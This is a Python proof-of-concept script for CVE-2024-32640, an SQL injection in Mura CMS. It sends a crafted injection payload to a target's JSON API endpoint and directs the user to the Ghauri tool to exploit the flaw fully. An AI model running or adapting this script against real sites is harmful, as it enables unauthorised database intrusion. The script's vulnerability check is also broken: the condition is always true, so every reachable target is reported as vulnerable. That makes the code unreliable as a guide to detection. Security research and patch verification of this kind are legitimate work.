import requests
import argparse
import urllib3
from urllib.parse import urlparse
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#ANSI
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
PURPLE = '\033[95m'
RESET = '\033[0m'

def banner():

    print(f"""


   ▄▄▄▄███▄▄▄▄   ███    █▄     ▄████████    ▄████████  ▄█  ████████▄     ▄████████    ▄████████ 
 ▄██▀▀▀███▀▀▀██▄ ███    ███   ███    ███   ███    ███ ███  ███   ▀███   ███    ███   ███    ███ 
 ███   ███   ███ ███    ███   ███    ███   ███    ███ ███▌ ███    ███   ███    █▀    ███    ███ 
 ███   ███   ███ ███    ███  ▄███▄▄▄▄██▀   ███    ███ ███▌ ███    ███  ▄███▄▄▄      ▄███▄▄▄▄██▀ 
 ███   ███   ███ ███    ███ ▀▀███▀▀▀▀▀   ▀███████████ ███▌ ███    ███ ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   
 ███   ███   ███ ███    ███ ▀███████████   ███    ███ ███  ███    ███   ███    █▄  ▀███████████ 
 ███   ███   ███ ███    ███   ███    ███   ███    ███ ███  ███   ▄███   ███    ███   ███    ███ 
  ▀█   ███   █▀  ████████▀    ███    ███   ███    █▀  █▀   ████████▀    ██████████   ███    ███ 
                              ███    ███                                             ███    ███ 

              {YELLOW}CVE-2024-32640.py - SQL Injection in Mura CMS)
        {GREEN}Usage: python3 CVE-2024-32640.py --url https://example.com/")
                       {PURPLE}Developer: @stuub)

          """)

def isAlive(url):
    try:
        r = requests.get(url, verify=False)
        if r.status_code == 200:
            return True
        else:
            return False
    except:
        return False

def Injection(url):
    host = urlparse(url).netloc
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Host": host,
    }
    data = {
    "object": "displayregion",
    "contenthistid": "x%5c",
    "previewid": "1"
}
    endpoint = "/_api/json/v1/default/?method=processAsyncObject&object=displayregion&contenthistid=x%5c&previewID=x"

    url = f"{url}{endpoint}"
    r = requests.post(url, headers=headers, verify=False, data=data)

    if "You have an error in your SQL syntax" or r.status_code == 500 in r.text:
        print(f"{GREEN}[+]{RESET} Target is vulnerable to SQL Injection.\n")
        print(f"{YELLOW}[!] For exploitation, use Ghauri:")
        print(f"{GREEN}[+]{RESET} https://github.com/r0oth3x49/ghauri")
    else:
        print(f"{RED}[-]{RESET} Target is not vulnerable")

def main():
    parser = argparse.ArgumentParser(description="CVE-2024-32640.py - SQL Injection in Mura CMS")
    parser.add_argument('-u', '--url', help="URL of the target")
    args = parser.parse_args()
    url = args.url

    parsedUrl = urlparse(url)
    strippedUrl = f"{parsedUrl.scheme}://{parsedUrl.netloc}"
    url = strippedUrl

    if isAlive(url):
        Injection(url)

if __name__ == "__main__":
    banner()
    main()